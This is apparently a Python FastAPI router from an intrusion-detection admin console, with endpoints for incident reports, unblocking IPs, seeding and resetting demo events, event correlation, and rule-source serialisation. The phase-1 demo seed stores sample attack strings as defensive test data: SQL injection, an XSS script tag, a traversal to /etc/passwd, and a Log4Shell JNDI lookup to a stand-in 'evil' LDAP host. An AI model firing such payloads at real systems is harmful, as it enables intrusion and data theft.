

@router.post("/events/{event_id}/unblock")
def unblock_event_ip(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    ok, msg = unblock_ip_windows(evt.client_ip or "")
    if ok:
        evt.blocked = 0
    evt.action_taken = "manual_unblock" if ok else "manual_unblock_failed"
    evt.response_result = "success" if ok else "failed"
    evt.response_detail = msg[:1000]
    db.commit()
    return {"code": 200, "message": "Unblock executed" if ok else f"Unblock failed: {msg}", "ok": ok}


@router.get("/events/{event_id}/report")
def get_event_report(
    event_id: int,
    force_ai: int = Query(0),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    if force_ai == 1 and settings.IDS_AI_ANALYSIS and is_llm_available():
        run_ai_analysis_sync(event_id)
        evt = _get_event_or_404(db, event_id)

    report = {
        "event_id": evt.id,
        "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "overview": {
            "time": evt.created_at.strftime("%Y-%m-%d %H:%M:%S") if evt.created_at else "",
            "client_ip": evt.client_ip,
            "attack_type": evt.attack_type,
            "attack_type_label": _attack_type_label(evt.attack_type),
            "method": evt.method,
            "path": evt.path,
            "status": evt.status or "new",
            "event_origin": evt.event_origin or REAL_EVENT_ORIGIN,
            "detector_name": evt.detector_name or "",
        },
        "score": {
            "risk_score": int(evt.risk_score or 0),
            "rule_confidence": int(evt.confidence or 0),
            "hit_count": int(evt.hit_count or 0),
            "ai_risk_level": evt.ai_risk_level or "",
            "ai_confidence": int(evt.ai_confidence or 0),
        },
        "evidence": {
            "signature": evt.signature_matched or "",
            "query_snippet": (evt.query_snippet or "")[:500],
            "body_snippet": (evt.body_snippet or "")[:500],
            "user_agent": (evt.user_agent or "")[:500],
        },
        "response": {
            "blocked": bool(evt.blocked),
            "firewall_rule": evt.firewall_rule or "",
            "action_taken": evt.action_taken or "",
            "review_note": evt.review_note or "",
            "response_result": evt.response_result or "",
            "response_detail": evt.response_detail or "",
        },
        "provenance": {
            "source_classification": evt.source_classification or "",
            "detector_family": evt.detector_family or "",
            "detector_name": evt.detector_name or "",
            "source_rule_id": evt.source_rule_id or "",
            "source_rule_name": evt.source_rule_name or "",
            "source_version": evt.source_version or "",
            "source_freshness": evt.source_freshness or "",
        },
        "ai_analysis": evt.ai_analysis or "",
    }
    markdown = (
        "# IDS Incident Report\n\n"
        f"- Event ID: {evt.id}\n"
        f"- Time: {report['overview']['time']}\n"
        f"- Client IP: {evt.client_ip}\n"
        f"- Type: {_attack_type_label(evt.attack_type)} ({evt.attack_type})\n"
        f"- Origin: {evt.event_origin or REAL_EVENT_ORIGIN}\n"
        f"- Detector: {evt.detector_name or '-'}\n"
        f"- Path: {evt.method} {evt.path}\n"
        f"- Risk Score: {int(evt.risk_score or 0)} / 100\n"
        f"- Confidence: {int(evt.confidence or 0)} / 100\n"
        f"- Hit Count: {int(evt.hit_count or 0)}\n"
        f"- Blocked: {'yes' if evt.blocked else 'no'}\n"
        f"- Firewall Rule: {evt.firewall_rule or '-'}\n\n"
        "## Evidence\n"
        f"- Signature: {evt.signature_matched or '-'}\n"
        f"- Query: {(evt.query_snippet or '-')[:500]}\n"
        f"- Body: {(evt.body_snippet or '-')[:500]}\n"
        f"- User-Agent: {(evt.user_agent or '-')[:300]}\n\n"
        "## AI Analysis\n"
        f"- Risk Level: {evt.ai_risk_level or 'unknown'}\n"
        f"- AI Confidence: {int(evt.ai_confidence or 0)}\n\n"
        f"{evt.ai_analysis or 'No AI analysis available.'}\n"
    )
    return {"report": report, "markdown": markdown}


@router.get("/demo/phase1/aggregate-report")
def get_phase1_aggregate_report(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    rows = (
        db.query(IDSEvent)
        .filter(IDSEvent.action_taken.like("demo_seed_phase1::%"))
        .order_by(IDSEvent.id.asc())
        .all()
    )
    if not rows:
        raise HTTPException(status_code=404, detail="No phase1 demo events found")

    ips = sorted({row.client_ip or "" for row in rows if row.client_ip})
    attack_labels: list[str] = []
    for row in rows:
        label = _attack_type_label(row.attack_type)
        if label not in attack_labels:
            attack_labels.append(label)

    max_score = max(int(row.risk_score or 0) for row in rows)
    max_conf = max(int(row.confidence or 0) for row in rows)
    blocked_count = sum(1 for row in rows if row.blocked)
    total_hits = sum(int(row.hit_count or 0) for row in rows)
    first_time = rows[0].created_at.strftime("%Y-%m-%d %H:%M:%S") if rows[0].created_at else ""
    by_attack = Counter((row.attack_type or "") for row in rows)

    return {
        "report": {
            "kind": "aggregate_phase1",
            "event_id": rows[0].id,
            "event_count": len(rows),
            "attack_type_labels": attack_labels,
            "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            "overview": {
                "time": first_time,
                "client_ip": ", ".join(ips[:6]) if ips else "-",
                "attack_type": "multi_vector",
                "attack_type_label": "Multi-vector demo chain",
                "method": "GET/POST",
                "path": "multiple endpoints",
                "status": "investigating",
            },
            "score": {
                "risk_score": max_score,
                "rule_confidence": max_conf,
                "hit_count": total_hits,
                "ai_risk_level": "high",
                "ai_confidence": min(99, max(88, max_conf - 2)),
            },
            "evidence": {
                "signature": "aggregate::demo_seed_phase1",
                "query_snippet": f"{len(rows)} demo events across {', '.join(attack_labels)}",
                "body_snippet": "See vector details in report",
                "user_agent": "RedTeam-AutoScanner/1.0",
            },
            "response": {
                "blocked": blocked_count > 0,
                "firewall_rule": f"IDS-Aggregate-{len(rows)}evt",
                "action_taken": "aggregate_investigation",
                "review_note": "Aggregated demo phase1 chain",
            },
            "analysis_json": {
                "report_type": "ids_ai_aggregate",
                "scenario": "multi_vector_concurrent_attack",
                "engine": "IDS_RULE_ENGINE + LLM_ASSIST",
                "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
                "summary": {
                    "total_events": len(rows),
                    "unique_source_ips": len(ips),
                    "peak_risk_score": max_score,
                    "blocked_count": blocked_count,
                    "aggregate_risk_level": "high",
                },
                "attack_families": [
                    {
                        "id": attack_id,
                        "name_zh": _attack_type_label(attack_id),
                        "description": "Aggregated from seeded demo events",
                        "detected": count > 0,
                        "event_count": int(count),
                    }
                    for attack_id, count in by_attack.items()
                ],
            },
            "vectors": [
                {
                    "attack_type": row.attack_type,
                    "attack_type_label": _attack_type_label(row.attack_type),
                    "client_ip": row.client_ip,
                    "method": row.method,
                    "path": (row.path or "")[:200],
                    "risk_score": int(row.risk_score or 0),
                    "blocked": bool(row.blocked),
                }
                for row in rows
            ],
            "ai_analysis": "Demo aggregation report for the phase1 attack chain.",
        }
    }


@router.post("/demo/phase1")
def seed_demo_phase1(
    req: DemoSeedRequest | None = None,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    db.query(IDSEvent).filter(IDSEvent.action_taken.like("demo_seed_phase1::%")).delete(synchronize_session=False)
    db.commit()

    rows = [
        ("sql_injection", "GET", "/api/purchase?kw=1' OR '1'='1", "192.168.31.101", 92, 95, 1, "firewall_block"),
        ("xss", "GET", "/api/trace?keyword=<script>alert(1)</script>", "192.168.31.101", 84, 90, 1, "logical_block_only"),
        ("path_traversal", "GET", "/api/upload/../../etc/passwd", "10.10.0.55", 88, 93, 1, "firewall_block"),
        ("cmd_injection", "POST", "/api/upload/public", "10.10.0.55", 86, 91, 1, "logical_block_only"),
        ("jndi_injection", "GET", "/api/overview/screen?x=${jndi:ldap://evil/a}", "172.20.1.90", 95, 98, 1, "firewall_block"),
        ("prototype_pollution", "POST", "/api/ai/chat", "172.20.1.90", 66, 78, 0, "record_only"),
        ("scanner", "GET", "/.git/config", "45.90.12.8", 59, 73, 0, "record_only"),
        ("scanner", "GET", "/wp-login.php", "45.90.12.8", 74, 81, 1, "logical_block_only"),
    ]

    seeded: list[int] = []
    for attack_type, method, path, ip, score, confidence, blocked, action in rows:
        evt = IDSEvent(
            client_ip=ip,
            attack_type=attack_type,
            signature_matched=f"demo_signature::{attack_type}",
            method=method,
            path=path,
            query_snippet=path.split("?", 1)[-1] if "?" in path else "",
            body_snippet="demo payload from red team automated testing",
            user_agent="RedTeam-AutoScanner/1.0",
            headers_snippet="{'x-demo':'phase1'}",
            blocked=blocked,
            firewall_rule=(f"IDS-Block-{ip.replace('.', '-')}" if blocked else ""),
            archived=0,
            status="investigating",
            review_note="Demo data: automated attack chain",
            action_taken=f"demo_seed_phase1::{action}",
            response_result="success" if blocked else "record_only",
            response_detail=action,
            risk_score=score,
            confidence=confidence,
            hit_count=2 if score >= 80 else 1,
            detect_detail='[{"attack":"demo","source":"seed"}]',
            ai_risk_level=("high" if score >= 85 else ("medium" if score >= 70 else "low")),
            ai_confidence=max(65, confidence - 5),
            ai_analysis=(
                f"Detected demo {_attack_type_label(attack_type)} activity.\n"
                f"Impact: simulated risk score {score}.\n"
                f"Evidence: source_ip={ip}; path={path}.\n"
                "Recommendation: keep demo events isolated from real metrics."
            ),
        )
        evt.created_at = datetime.utcnow()
        evt.ai_analyzed_at = evt.created_at
        apply_source_metadata(
            evt,
            event_origin=DEMO_EVENT_ORIGIN,
            source_classification=SOURCE_CUSTOM_PROJECT,
            detector_family="web",
            detector_name="demo_phase1_seed",
            source_rule_id=f"demo_signature::{attack_type}",
            source_rule_name=attack_type,
            source_version="demo-phase1",
            source_freshness="current",
            occurred_at=evt.created_at,
        )
        db.add(evt)
        db.flush()
        seeded.append(evt.id)

    db.commit()
    if (req.auto_analyze if req else True) and settings.IDS_AI_ANALYSIS and is_llm_available() and seeded:
        run_ai_analysis_sync(seeded[0])
    return {"code": 200, "message": "Phase1 demo events created", "event_ids": seeded}


@router.post("/demo/phase2")
def seed_demo_phase2(
    req: DemoSeedRequest | None = None,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    db.query(IDSEvent).filter(IDSEvent.action_taken.like("demo_seed_phase2::%")).delete(synchronize_session=False)
    db.commit()

    now = datetime.utcnow()
    evt = IDSEvent(
        client_ip="172.16.9.23",
        attack_type="malware",
        signature_matched="demo_malware_upload::webshell",
        method="POST",
        path="/api/upload/public",
        query_snippet="filename=report.jsp",
        body_snippet="multipart/form-data; suspicious webshell payload detected",
        user_agent="Manual-Attack/Browser",
        headers_snippet="{'content-type':'multipart/form-data'}",
        blocked=1,
        firewall_rule="IDS-Block-172-16-9-23",
        archived=0,
        status="mitigated",
        review_note="Demo data: webshell upload interception",
        action_taken="demo_seed_phase2::firewall_block",
        response_result="success",
        response_detail="firewall_block",
        risk_score=97,
        confidence=99,
        hit_count=3,
        detect_detail='[{"attack":"webshell_upload","source":"seed"}]',
        ai_risk_level="high",
        ai_confidence=97,
        ai_analysis=(
            "Detected demo webshell upload event.\n"
            "Impact: simulated high-risk file upload.\n"
            "Evidence: upload endpoint and suspicious payload markers.\n"
            "Recommendation: keep demo file events isolated from real metrics."
        ),
    )
    evt.created_at = now
    evt.ai_analyzed_at = now
    apply_source_metadata(
        evt,
        event_origin=DEMO_EVENT_ORIGIN,
        source_classification=SOURCE_CUSTOM_PROJECT,
        detector_family="file",
        detector_name="demo_phase2_seed",
        source_rule_id="demo_malware_upload::webshell",
        source_rule_name="malware",
        source_version="demo-phase2",
        source_freshness="current",
        occurred_at=now,
    )
    db.add(evt)
    db.commit()
    db.refresh(evt)

    if (req.auto_analyze if req else True) and settings.IDS_AI_ANALYSIS and is_llm_available():
        run_ai_analysis_sync(evt.id)
    return {"code": 200, "message": "Phase2 demo event created", "event_id": evt.id}


@router.post("/demo/reset")
def reset_demo_events(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    deleted = (
        db.query(IDSEvent)
        .filter(IDSEvent.event_origin == DEMO_EVENT_ORIGIN)
        .delete(synchronize_session=False)
    )
    db.commit()
    return {"code": 200, "message": f"Deleted {deleted} demo events", "deleted": deleted}


@router.post("/events/archive-batch")
def archive_batch(
    req: ArchiveBatchRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    event_ids = req.event_ids or []
    if not event_ids:
        return {"code": 200, "message": "No events selected", "archived": 0}
    db.query(IDSEvent).filter(IDSEvent.id.in_(event_ids)).update(
        {
            IDSEvent.archived: 1,
            IDSEvent.status: "closed",
            IDSEvent.response_result: "success",
            IDSEvent.response_detail: "archived_by_batch",
        },
        synchronize_session=False,
    )
    db.commit()
    return {"code": 200, "message": f"Archived {len(event_ids)} events", "archived": len(event_ids)}


def _find_correlated_ingested_event(
    db: Session,
    *,
    event_origin: str,
    event_fingerprint: str,
    correlation_key: str,
    occurred_at: datetime,
) -> IDSEvent | None:
    # Bound correlation to active recent incidents so review stays manageable.
    review_window_start = occurred_at - timedelta(hours=24)
    q = (
        db.query(IDSEvent)
        .filter(IDSEvent.archived == 0)
        .filter(IDSEvent.event_origin == event_origin)
        .filter(IDSEvent.created_at >= review_window_start)
    )
    if event_fingerprint:
        evt = q.filter(IDSEvent.event_fingerprint == event_fingerprint).order_by(IDSEvent.id.desc()).first()
        if evt:
            return evt
    if correlation_key:
        evt = q.filter(IDSEvent.correlation_key == correlation_key).order_by(IDSEvent.id.desc()).first()
        if evt:
            return evt
    return None


def _merge_ingested_event(
    evt: IDSEvent,
    *,
    req: IngestEventRequest,
    raw_evidence: IngestRawEvidence,
    event_fingerprint: str,
    correlation_key: str,
):
    evt.hit_count = int(evt.hit_count or 0) + 1
    evt.risk_score = max(int(evt.risk_score or 0), _severity_to_risk_score(req.severity, req.confidence))
    evt.confidence = max(int(evt.confidence or 0), int(req.confidence or 0))
    evt.signature_matched = (req.rule_name or req.rule_id or evt.signature_matched or "")[:128]
    evt.response_result = evt.response_result or "record_only"
    evt.response_detail = (req.evidence_summary or evt.response_detail or "ingest_correlated")[:1000]
    evt.action_taken = f"ingested::{req.source_classification}::correlated"
    if raw_evidence.method:
        evt.method = raw_evidence.method[:16].upper()
    if raw_evidence.path or req.asset_ref:
        evt.path = (raw_evidence.path or req.asset_ref)[:512]
    if raw_evidence.query_snippet:
        evt.query_snippet = raw_evidence.query_snippet[:500]
    if raw_evidence.body_snippet:
        evt.body_snippet = raw_evidence.body_snippet[:500]
    if raw_evidence.user_agent:
        evt.user_agent = raw_evidence.user_agent[:512]
    if raw_evidence.headers_snippet:
        evt.headers_snippet = raw_evidence.headers_snippet[:1000]
    evt.detect_detail = _build_ingested_detect_detail(req, raw_evidence)
    apply_source_metadata(
        evt,
        event_origin=req.event_origin,
        source_classification=req.source_classification,
        detector_family=req.detector_family,
        detector_name=req.detector_name,
        source_rule_id=req.rule_id,
        source_rule_name=req.rule_name,
        source_version=req.source_version,
        source_freshness=req.source_freshness,
        occurred_at=req.occurred_at,
        event_fingerprint=event_fingerprint,
        correlation_key=correlation_key,
    )


def _severity_to_risk_score(severity: str | None, confidence: int | None) -> int:
    base = {
        "low": 35,
        "medium": 60,
        "high": 82,
        "critical": 96,
    }.get((severity or "").strip().lower(), 60)
    confidence_score = max(0, min(100, int(confidence or 0)))
    return max(base, confidence_score)


def _build_ingested_detect_detail(req: IngestEventRequest, raw_evidence: IngestRawEvidence) -> str:
    summary = (req.evidence_summary or "").strip()
    detail_parts = [
        f"origin={req.event_origin}",
        f"source={req.source_classification}",
        f"detector={req.detector_name}",
        f"rule_id={req.rule_id or '-'}",
        f"rule_name={req.rule_name or '-'}",
        f"severity={req.severity or '-'}",
        f"summary={summary or '-'}",
        f"method={(raw_evidence.method or '').strip().upper() or '-'}",
        f"path={(raw_evidence.path or req.asset_ref or '').strip() or '-'}",
    ]
    return " | ".join(detail_parts)[:4000]


def _filtered_ids_query(
    db: Session,
    *,
    attack_type: str | None = None,
    client_ip: str | None = None,
    blocked: int | None = None,
    archived: int | None = None,
    status: str | None = None,
    event_origin: str | None = None,
    source_classification: str | None = None,
    min_score: int | None = None,
):
    q = db.query(IDSEvent)
    if attack_type:
        q = q.filter(IDSEvent.attack_type == attack_type)
    if client_ip:
        q = q.filter(IDSEvent.client_ip.contains(client_ip))
    if blocked is not None:
        q = q.filter(IDSEvent.blocked == blocked)
    if archived is not None:
        q = q.filter(IDSEvent.archived == archived)
    if status:
        q = q.filter(IDSEvent.status == status)
    if event_origin:
        q = q.filter(IDSEvent.event_origin == event_origin)
    if source_classification:
        q = q.filter(IDSEvent.source_classification == source_classification)
    if min_score is not None:
        q = q.filter(IDSEvent.risk_score >= min_score)
    return q


def _get_event_or_404(db: Session, event_id: int) -> IDSEvent:
    evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt:
        raise HTTPException(status_code=404, detail="Event not found")
    return evt


def _attack_type_label(attack_type: str | None) -> str:
    labels = {
        "sql_injection": "SQL Injection",
        "xss": "XSS",
        "path_traversal": "Path Traversal",
        "cmd_injection": "Command Injection",
        "scanner": "Scanner / Probe",
        "malformed": "Malformed Request",
        "jndi_injection": "JNDI / Log4Shell",
        "prototype_pollution": "Prototype Pollution",
        "malware": "Malware / WebShell",
    }
    return labels.get(attack_type or "", attack_type or "-")


def _event_origin_label(origin: str | None) -> str:
    labels = {"real": "Real", "demo": "Demo", "test": "Test"}
    return labels.get((origin or "").strip(), origin or REAL_EVENT_ORIGIN)


def _get_source_or_404(db: Session, source_id: int) -> IDSSource:
    source = db.query(IDSSource).filter(IDSSource.id == source_id).first()
    if not source:
        raise HTTPException(status_code=404, detail="Source not found")
    return source


def _validate_source_registry_request(
    req: SourceRegistryRequest,
    *,
    db: Session,
    source_id: int | None = None,
) -> dict:
    source_key = normalize_source_key(req.source_key)
    display_name = (req.display_name or "").strip()[:128]
    trust_classification = (req.trust_classification or "").strip()
    detector_family = (req.detector_family or "").strip()[:32]
    operational_status = (req.operational_status or "").strip()
    sync_mode = (req.sync_mode or "").strip()
    provenance_note = (req.provenance_note or "").strip()[:2000]

    if not source_key:
        raise HTTPException(status_code=400, detail="source_key is required")
    if not display_name:
        raise HTTPException(status_code=400, detail="display_name is required")
    if trust_classification not in TRUST_CLASSIFICATIONS:
        raise HTTPException(status_code=400, detail=f"Invalid trust_classification: {trust_classification}")
    if not detector_family:
        raise HTTPException(status_code=400, detail="detector_family is required")
    if operational_status not in OPERATIONAL_STATUSES:
        raise HTTPException(status_code=400, detail=f"Invalid operational_status: {operational_status}")
    if sync_mode not in SYNC_MODES:
        raise HTTPException(status_code=400, detail=f"Invalid sync_mode: {sync_mode}")
    if trust_classification == SOURCE_DEMO_TEST and sync_mode != SYNC_MODE_NOT_APPLICABLE:
        raise HTTPException(status_code=400, detail="demo_test sources must use sync_mode=not_applicable")

    existing = db.query(IDSSource).filter(IDSSource.source_key == source_key).first()
    if existing and existing.id != source_id:
        raise HTTPException(status_code=400, detail=f"source_key already exists: {source_key}")

    return {
        "source_key": source_key,
        "display_name": display_name,
        "trust_classification": trust_classification,
        "detector_family": detector_family,
        "operational_status": operational_status,
        "freshness_target_hours": int(req.freshness_target_hours),
        "sync_mode": sync_mode,
        "provenance_note": provenance_note,
    }


def _format_dt(value: datetime | None) -> str | None:
    return value.strftime("%Y-%m-%d %H:%M:%S") if value else None


def _serialize_source_sync_attempt(attempt: IDSSourceSyncAttempt) -> dict:
    return {
        "id": attempt.id,
        "source_id": attempt.source_id,
        "started_at": _format_dt(attempt.started_at),
        "finished_at": _format_dt(attempt.finished_at),
        "result_status": attempt.result_status or "",
        "detail": (attempt.detail or "")[:1000],
        "freshness_after_sync": attempt.freshness_after_sync or "",
        "triggered_by": attempt.triggered_by or "",
    }


def _serialize_ids_source(
    source: IDSSource,
    *,
    activity: dict | None = None,
    attempts: list[IDSSourceSyncAttempt] | None = None,
    package_intakes: list[IDSSourcePackageIntake] | None = None,
    package_activation: IDSSourcePackageActivation | None = None,
) -> dict:
    activity = activity or {}
    attempts = attempts or []
    package_intakes = package_intakes or []
    health_state = derive_source_health_state(source)
    recent_count = int(activity.get("recent_incident_count") or 0)
    recent_last_seen = activity.get("recent_incident_last_seen_at")
    package_preview = build_package_preview_summary(
        source,
        package_version=package_intakes[0].package_version if package_intakes else "",
        release_timestamp=package_intakes[0].release_timestamp if package_intakes else None,
        provenance_note=package_intakes[0].provenance_note if package_intakes else "",
        active_activation=package_activation,
    ) if package_intakes else None
    return {
        "id": source.id,
        "source_key": source.source_key or "",
        "display_name": source.display_name or "",
        "trust_classification": source.trust_classification or "",
        "detector_family": source.detector_family or "",
        "operational_status": source.operational_status or "",
        "freshness_target_hours": int(source.freshness_target_hours or 0),
        "sync_mode": source.sync_mode or "",
        "last_synced_at": _format_dt(source.last_synced_at),
        "last_sync_status": source.last_sync_status or "",
        "last_sync_detail": (source.last_sync_detail or "")[:1000],
        "health_state": health_state,
        "visible_warning": build_source_warning(source, health_state=health_state),
        "recent_incident_count": recent_count,
        "recent_incident_last_seen_at": _format_dt(recent_last_seen if isinstance(recent_last_seen, datetime) else None),
        "provenance_note": (source.provenance_note or "")[:2000],
        "is_production_trusted": is_trusted_production_source(source),
        "created_at": _format_dt(source.created_at),
        "updated_at": _format_dt(source.updated_at),
        "latest_sync_attempt": _serialize_source_sync_attempt(attempts[0]) if attempts else None,
        "recent_sync_attempts": [_serialize_source_sync_attempt(attempt) for attempt in attempts],
        "active_package_version": package_activation.package_version if package_activation else "",
        "active_package_activated_at": _format_dt(package_activation.activated_at) if package_activation else None,
        "active_package_activated_by": package_activation.activated_by if package_activation else "",
        "latest_package_preview": package_preview,
        "recent_package_intakes": [_serialize_source_package_intake(intake) for intake in package_intakes],
    }


def _serialize_source_package_intake(intake: IDSSourcePackageIntake) -> dict:
    return {
        "id": intake.id,
        "source_id": intake.source_id,
        "source_key": intake.source_key or "",
        "package_version": intake.package_version or "",
        "release_timestamp": _format_dt(intake.release_timestamp),
        "trust_classification": intake.trust_classification or "",
        "detector_family": intake.detector_family or "",
        "provenance_note": (intake.provenance_note or "")[:2000],
        "intake_result": intake.intake_result or "",
        "intake_detail": (intake.intake_detail or "")[:1000],
        "triggered_by": intake.triggered_by or "",
        "created_at": _format_dt(intake.created_at),
    }


def _serialize_source_package_activation(activation: IDSSourcePackageActivation) -> dict:
    return {
        "id": activation.id,
        "source_id": activation.source_id,
        "package_intake_id": activation.package_intake_id,
        "package_version": activation.package_version or "",
        "activated_at": _format_dt(activation.activated_at),
        "activated_by": activation.activated_by or "",
        "activation_detail": (activation.activation_detail or "")[:1000],
        "created_at": _format_dt(activation.created_at),
    }


def _serialize_rulepack_runtime_state(state: IDSRulepackRuntimeState) -> dict:
    return {
        "id": state.id,
        "active_rulepack_key": state.active_rulepack_key or DEFAULT_RULEPACK_KEY,
        "updated_by": state.updated_by or "",
        "update_note": (state.update_note or "")[:1000],
        "updated_at": _format_dt(state.updated_at),
        "created_at": _format_dt(state.created_at),
    }


def _serialize_rulepack_activation(activation: IDSRulepackActivation) -> dict:
    return {
        "id": activation.id,
        "rulepack_key": activation.rulepack_key or "",
        "pack_version": activation.pack_version or "",
        "trust_classification": activation.trust_classification or "",
        "detector_family": activation.detector_family or "",
        "result_status": activation.result_status or "",
        "activation_detail": (activation.activation_detail or "")[:1000],
        "triggered_by": activation.triggered_by or "",
        "created_at": _format_dt(activation.created_at),
    }


def _build_source_package_history_item(
    source: IDSSource,
    *,
    intakes: list[IDSSourcePackageIntake],
    activations: list[IDSSourcePackageActivation],
) -> dict:
    latest_activation = activations[0] if activations else None
    return {
        "source": {
            "id": source.id,
            "source_key": source.source_key or "",
            "display_name": source.display_name or "",
            "trust_classification": source.trust_classification or "",
            "detector_family": source.detector_family or "",
        },
        "source_key": source.source_key or "",
        "active_package_version": latest_activation.package_version if latest_activation else "",
        "active_package_activated_at": _format_dt(latest_activation.activated_at) if latest_activation else None,
        "active_package_activated_by": latest_activation.activated_by if latest_activation else "",
        "recent_intakes": [_serialize_source_package_intake(intake) for intake in intakes],
        "recent_activations": [_serialize_source_package_activation(activation) for activation in activations],
    }


def _write_ids_audit_log(
    db: Session,
    *,
    current_user,
    action: str,
    target_type: str,
    target_id: str,
    detail: str,
):
    user_id = getattr(current_user, "id", None)
    user_name = (
        getattr(current_user, "real_name", None)
        or getattr(current_user, "username", None)
        or "system_admin"
    )
    user_role = getattr(current_user, "role", None) or "system_admin"
    write_audit_log(
        db,
        user_id=user_id,
        user_name=str(user_name)[:64],
        user_role=str(user_role)[:64],
        action=(action or "")[:64],
        target_type=(target_type or "")[:64],
        target_id=(target_id or "")[:64],
        detail=(detail or "")[:512],
    )


def _record_failed_package_activation(
    intake: IDSSourcePackageIntake,
    *,
    detail: str,
    triggered_by: str,
    db: Session,
):
    intake.intake_result = PACKAGE_RESULT_FAILED
    intake.intake_detail = detail[:1000]
    intake.triggered_by = triggered_by or intake.triggered_by or ""
    db.commit()
    db.refresh(intake)


def _build_activation_failure_detail(reason: str, *, activation_note: str = "") -> str:
    if activation_note:
        return f"{reason} Operator note: {activation_note}"
    return reason


def _summarize_sources(items: list[dict]) -> dict:
    healthy_count = sum(1 for item in items if item.get("health_state") == HEALTH_HEALTHY)
    degraded_count = sum(1 for item in items if item.get("health_state") != HEALTH_HEALTHY)
    trusted_count = sum(1 for item in items if item.get("is_production_trusted"))
    demo_test_count = sum(1 for item in items if not item.get("is_production_trusted"))
    return {
        "total": len(items),
        "healthy_count": healthy_count,
        "degraded_count": degraded_count,
        "trusted_count": trusted_count,
        "demo_test_count": demo_test_count,
    }


def _serialize_ids_event(row: IDSEvent) -> dict:
    return {
        "id": row.id,
        "client_ip": row.client_ip,
        "event_origin": row.event_origin or REAL_EVENT_ORIGIN,
        "event_origin_label": _event_origin_label(row.event_origin),
        "source_classification": row.source_classification or "",
        "detector_family": row.detector_family or "",
        "detector_name": row.detector_name or "",
        "source_rule_id": row.source_rule_id or "",
        "source_rule_name": row.source_rule_name or "",
        "source_version": row.source_version or "",
        "source_freshness": row.source_freshness or "",
        "event_fingerprint": row.event_fingerprint or "",
        "correlation_key": row.correlation_key or "",
        "counted_in_real_metrics": (row.event_origin or REAL_EVENT_ORIGIN) == REAL_EVENT_ORIGIN,
        "attack_type": row.attack_type,
        "attack_type_label": _attack_type_label(row.attack_type),
        "signature_matched": row.signature_matched,
        "method": row.method,
        "path": row.path,
        "query_snippet": (row.query_snippet or "")[:200],
        "body_snippet": (row.body_snippet or "")[:200],
        "user_agent": (row.user_agent or "")[:200],
        "blocked": row.blocked,
        "firewall_rule": row.firewall_rule or "",
        "archived": row.archived,
        "status": row.status or "new",
        "review_note": (row.review_note or "")[:500],
        "action_taken": row.action_taken or "",
        "response_result": row.response_result or "",
        "response_detail": (row.response_detail or "")[:1000],
        "risk_score": int(row.risk_score or 0),
        "confidence": int(row.confidence or 0),
        "hit_count": int(row.hit_count or 0),
        "created_at": row.created_at.strftime("%Y-%m-%d %H:%M:%S") if row.created_at else None,
        "ai_risk_level": row.ai_risk_level or "",
        "ai_analysis": (row.ai_analysis or "")[:2000],
        "ai_confidence": int(row.ai_confidence or 0),
        "ai_analyzed_at": row.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S") if row.ai_analyzed_at else None,
    }
